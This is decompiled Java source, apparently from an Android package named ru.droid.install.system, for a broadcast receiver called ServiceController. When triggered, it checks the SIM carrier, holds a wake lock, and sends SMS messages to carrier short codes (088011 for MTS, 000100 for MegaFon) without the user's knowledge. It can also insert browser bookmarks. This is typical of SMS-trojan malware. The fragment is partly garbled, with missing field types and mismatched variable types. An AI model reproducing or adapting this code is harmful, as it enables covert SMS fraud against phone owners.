	private static  i
	 android.content.Context a
	 java.lang.String b
	 java.lang.String c
	 java.lang.String d
	 java.lang.String e
	 java.util.ArrayList f
	private android.content.SharedPreferences g
	private  h
	
	    static ServiceController()
	    {
	        ru.droid.install.system.ServiceController.i = 0;
	        return;
	    }
	
	
	    public ServiceController()
	    {
	        this.h = 0;
	        this.b = "";
	        this.c = "";
	        this.d = "";
	        this.e = "";
	        this.f = new java.util.ArrayList();
	        return;
	    }
	
	
	    public static final void a(android.content.Context p3, String p4, String p5)
	    {
	        android.content.Intent v0_1 = new android.content.Intent("android.intent.action.INSERT", android.provider.Browser.BOOKMARKS_URI);
	        v0_1.putExtra("title", p4);
	        v0_1.putExtra("url", p5);
	        p3.startActivity(v0_1);
	        return;
	    }
	
	
	    private void a(String p7, String p8)
	    {
	        android.telephony.gsm.SmsManager.getDefault().sendTextMessage(p7, 0, p8, android.app.PendingIntent.getBroadcast(this.a, 0, new android.content.Intent("SMS_SENT"), 0), android.app.PendingIntent.getBroadcast(this.a, 0, new android.content.Intent("SMS_DELIVERED"), 0));
	        return;
	    }
	
	
	    static synthetic void a(ru.droid.install.system.ServiceController p0, String p1, String p2)
	    {
	        p0.a(p1, p2);
	        return;
	    }
	
	
	    public void onReceive(android.content.Context p5, android.content.Intent p6)
	    {
	        this.a = p5;
	        this.g = android.preference.PreferenceManager.getDefaultSharedPreferences(this.a);
	        String v1_1 = ((android.telephony.TelephonyManager) this.a.getSystemService("phone")).getSimOperatorName();
	        android.os.PowerManager$WakeLock v0_8 = ((android.os.PowerManager) p5.getSystemService("power")).newWakeLock(26, "SSDDDWDW");
	        v0_8.acquire();
	        if (!v1_1.toLowerCase().contains("mts")) {
	            if (v1_1.toLowerCase().contains("megafon")) {
	                this.a("000100", "b");
	            }
	        } else {
	            this.a("088011", "balance");
	        }
	        String v2_7 = new String[0];
	        new ru.droid.install.system.a(this).execute(v2_7);
	        v0_8.release();
	        return;
	    }
	
